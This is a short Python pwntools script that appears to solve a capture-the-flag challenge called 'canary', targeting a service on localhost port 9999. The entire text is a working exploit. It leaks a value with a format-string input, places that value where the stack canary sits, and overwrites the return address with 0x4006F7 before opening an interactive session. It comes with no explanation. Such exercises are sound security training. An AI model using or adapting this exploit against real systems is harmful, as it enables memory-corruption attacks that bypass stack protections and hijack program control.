from pwn import *
from time import *

# p=process("./canary")
p=remote("127.0.0.1",9999)
context(log_level='debug', os='linux', arch='amd64')
flag=0x06016C0
p.sendlineafter("it",b'%11$p')
p.recvuntil("gift:")
stack=int(p.recv(18),16)
payload=b'a'*0x28+p64(stack)+b'a'*8+p64(0x4006F7)
p.sendlineafter("attack",payload)
p.interactive()